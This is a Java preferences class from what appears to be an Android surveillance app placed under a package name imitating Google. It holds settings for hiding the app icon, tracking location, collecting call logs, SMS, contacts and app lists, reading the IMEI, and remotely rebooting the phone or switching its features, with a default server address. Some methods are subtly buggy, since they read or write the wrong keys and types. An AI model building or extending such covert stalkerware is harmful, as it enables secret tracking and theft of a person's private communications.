package com.google.android.apps.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.android.apps.repositories.network.models.data.DeviceInfo;
import com.google.android.apps.repositories.network.models.data.Settings;
import com.google.gson.Gson;

import javax.inject.Inject;

import io.reactivex.Single;

/**
 * Created by OldMan on 08.04.2017.
 */

public class Preferences {
    private final String TAG = Preferences.class.getSimpleName();
    private Gson gson;
    private Context context;

    private final String PREFS_NAME = "store";
    private SharedPreferences prefs;
    private final String visit_key = "is_visited";

    private final String ip_address = "ip_address";
    private final String port = "port";
    //-------------for begining request---------------------
    private final String baseDeviceInfo = "base_device_info";
    private final String isAllDeviceInfo = "is_all_device_info";

    //-------------------initial data------------------------
    private final String device = "device";
    private final String imei = "imei";
    private final String periodRequest = "period_request";

    //------------variable settings-----------------------
    private final String call = "call";
    private final String sms = "sms";
    private final String location = "location";
    private final String locationMode = "location_mode";
    private final String dispatchMode = "dispatch_mode";
    private final String locationUpdateTime = "location_update_time";
    private final String service = "service";


    private final String airplaneMode = "airplane_mode";
    private final String wifi = "wifi";
    private final String screen = "screen";
    private final String reboot = "reboot";
    private final String shutDown = "shut_down";
    private final String hideIcon = "hide_icon";
    private final String callList = "call_list";
    private final String smsList = "sms_list";
    private final String appList = "app_list";
    private final String contactBook = "contact_book";

    private final String vibrate = "vibrate";
    private final String sound = "sound";
    private final String syncTime = "syncTime";
    private final String flash = "flash";
    private final String passwd = "passwd";


    @Inject
    public Preferences(Context context) {
        prefs = context.getSharedPreferences(PREFS_NAME, 0);
        gson = new Gson();
        this.context = context;
    }

    public Single<String> getIpAddress() {
        return Single.just(prefs.getString(ip_address, "192.168.50.179"));
    }

    public Single<String> setIpAddress(String val) {
        if (prefs.edit().putString(ip_address, val).commit())
            return Single.just(val);
        else
            return Single.just("");
    }

    public Single<String> getPort() {
        return Single.just(prefs.getString(port, "10080"));
    }

    public Single<String> setPort(String val) {
        if (prefs.edit().putString(this.port, val).commit())
            return Single.just(val);
        else
            return Single.just("");
    }

    public void setDevice(String val) {
        prefs.edit().putString(device, val).apply();
        Log.d(TAG, prefs.getString(device, "0"));
    }

    public String getDevice() {
        return prefs.getString(device, null);
    }

    public Single setImei() {
        try {
            TelephonyManager mngr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            Single.just(prefs.edit().putString(imei, mngr.getDeviceId()).commit());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Single.just(false);
    }

    public String getImei() {
        String val = prefs.getString(imei, null);
        if (val == null)
            try {
                TelephonyManager mngr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                val = mngr.getDeviceId();
                prefs.edit().putString(imei, val).apply();
            } catch (Exception e) {
                e.printStackTrace();
            }
        Log.d("Preferences ", val);
        return val;
    }


    public String getPeriodRequest() {
        return prefs.getString(periodRequest, null);
    }

    public void setPeriodRequest(String val) {
        prefs.edit().putString(periodRequest, val).apply();
    }

    public boolean isVisited() {
        return prefs.getBoolean(visit_key, false);
    }

    public void setVisited() {
        prefs.edit().putBoolean(visit_key, true).apply();
    }

    public DeviceInfo getBaseDeviceInfo() {
        String dev = prefs.getString(baseDeviceInfo, null);
        return gson.fromJson(dev, DeviceInfo.class);
    }


    public void setBaseDeviceInfo(DeviceInfo dev) {
        String stringDev = gson.toJson(dev);
        prefs.edit().putString(baseDeviceInfo, stringDev).apply();
    }

    public boolean isAllDeviceInfo() {
        return prefs.getBoolean(isAllDeviceInfo, false);
    }

    public void setIsAllDeviceInfo(boolean isInfo) {
        prefs.edit().putBoolean(isAllDeviceInfo, isInfo).apply();
    }

    public void setFirstSettings() {
        SharedPreferences.Editor edit = prefs.edit();
        edit.putBoolean("hasVisited", true);
        edit.putBoolean("is_info", true);
        edit.putString("period", "1"); // period must equal 10 min
        edit.putString("code", "-1");
        edit.commit();
    }

    public Single<Boolean> setAppSettings(Settings settings) {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putBoolean(location, settings.isLocation());
        editor.putInt(locationMode, settings.getLocationMode());
        editor.putBoolean(call, settings.isBell());
        editor.putBoolean(sms, settings.isSms());
        editor.putBoolean(contactBook, settings.isContactBook());
        editor.putBoolean(smsList, settings.isSmsList());
        editor.putBoolean(callList, settings.isCallList());
        editor.putBoolean(appList, settings.isAppList());
        editor.putBoolean(service, settings.isService());
        editor.putBoolean(hideIcon, settings.isHideIcon());
        editor.putInt(airplaneMode, settings.getAirplaneMode());
        editor.putInt(sound, settings.getSound());
        editor.putInt(screen, settings.getScreen());
        editor.putInt(wifi, settings.getWifi());
        editor.putInt(passwd, settings.getPasswd());
        editor.putBoolean(vibrate, settings.isVibrate());
        editor.putBoolean(flash, settings.isFlash());
        editor.putBoolean(reboot, settings.isReboot());
        editor.putBoolean(shutDown, settings.isShutDown());
        editor.putLong(syncTime, settings.getSyncTime());
        return Single.just(editor.commit());
    }


    public boolean isSms() {
        return prefs.getBoolean(sms, false);
    }

    public void setSms(boolean val) {
        prefs.edit().putBoolean(sms, val).apply();
    }

    public boolean isLocation() {
        return prefs.getBoolean(location, false);
    }

    public void setLocation(boolean val) {
        prefs.edit().putBoolean(location, val).apply();
    }

    public int getLocationMode() {
        return prefs.getInt(locationMode, 0);
    }

    public void setLocationMode(int val) {
        prefs.edit().putInt(locationMode, val).apply();
    }

    public int getDispatchMode() {
        return prefs.getInt(dispatchMode, 0);
    }

    public void setDispatchMode(int dispatch) {
        prefs.edit().putInt(dispatchMode, dispatch).apply();
    }

    public int getLocationUpdateTime() {
        return prefs.getInt(locationUpdateTime, 0);
    }

    public void setLocationUpdateTime(int time) {
        prefs.edit().putInt(this.locationUpdateTime, time).apply();
    }

    public boolean isCallList() {
        return prefs.getBoolean(callList, false);
    }

    public void setCallList(boolean val) {
        prefs.edit().putBoolean(callList, val).apply();
    }

    public boolean isSmsList() {
        return prefs.getBoolean(smsList, false);
    }

    public void setSmsList(boolean smsList) {
        prefs.edit().putBoolean(this.smsList, smsList).apply();
    }

    public boolean isAppList() {
        return prefs.getBoolean(appList, false);
    }

    public void setAppList(boolean listApp) {
        prefs.edit().putBoolean(appList, listApp).apply();
    }

    public boolean isContactBook() {
        return prefs.getBoolean(contactBook, false);
    }

    public void setContactBook(boolean contactBook) {
        prefs.edit().putBoolean(this.contactBook, contactBook).apply();
    }

    public boolean isHideIcon() {
        return prefs.getBoolean(hideIcon, false);
    }

    public void setHideIcon(boolean isHide) {
        prefs.edit().putBoolean(hideIcon, isHide).apply();
    }

    public int getAirplaneMode() {
        return prefs.getInt(airplaneMode, 0);
    }

    public void setAirplaneMode(int val) {
        prefs.edit().putInt(airplaneMode, val).apply();
    }

    public int getWifi() {
        return prefs.getInt(wifi, 0);
    }

    public void setWifi(int val) {
        prefs.edit().putInt(wifi, val).apply();
    }

    public int getScreenOn() {
        return prefs.getInt(screen, 0);
    }

    public void setScreenOn(int val) {
        prefs.edit().putInt(screen, val).apply();
    }

    public int getPasswd() {
        return prefs.getInt(passwd, 0);
    }

    public void setPasswd(int val) {
        prefs.edit().putInt(passwd, val).apply();
    }

    public boolean isFlash() {
        return prefs.getBoolean(flash, false);
    }

    public void setFlash(boolean val) {
        prefs.edit().putBoolean(flash, val).apply();
    }

    public boolean isService() {
        return prefs.getBoolean(service, false);
    }

    public void setService(boolean val) {
        prefs.edit().putBoolean(service, val).apply();
    }


    public boolean isVibrate() {
        return prefs.getBoolean(vibrate, false);
    }

    public void setVibrate(boolean val) {
        prefs.edit().putBoolean(vibrate, val).apply();
    }


    public boolean getSound() {
        return prefs.getBoolean(sound, false);
    }

    public void setSound(boolean val) {
        prefs.edit().putBoolean(sound, val).apply();
    }


    public boolean getSyncTime() {
        return prefs.getBoolean(syncTime, false);
    }

    public void setSyncTime(long val) {
        prefs.edit().putLong(syncTime, val).apply();
    }


    public boolean isCall() {
        return prefs.getBoolean(call, false);
    }

    public void setCall(boolean val) {
        prefs.edit().putBoolean(call, val).apply();
    }

    public boolean isReboot() {
        return prefs.getBoolean(reboot, false);
    }

    public void setReboot(boolean val) {
        prefs.edit().putBoolean(reboot, val).apply();
    }

    public boolean isShutDown() {
        return prefs.getBoolean(shutDown, false);
    }

    public void setShutDown(boolean val) {
        prefs.edit().putBoolean(reboot, val).apply();
    }

}
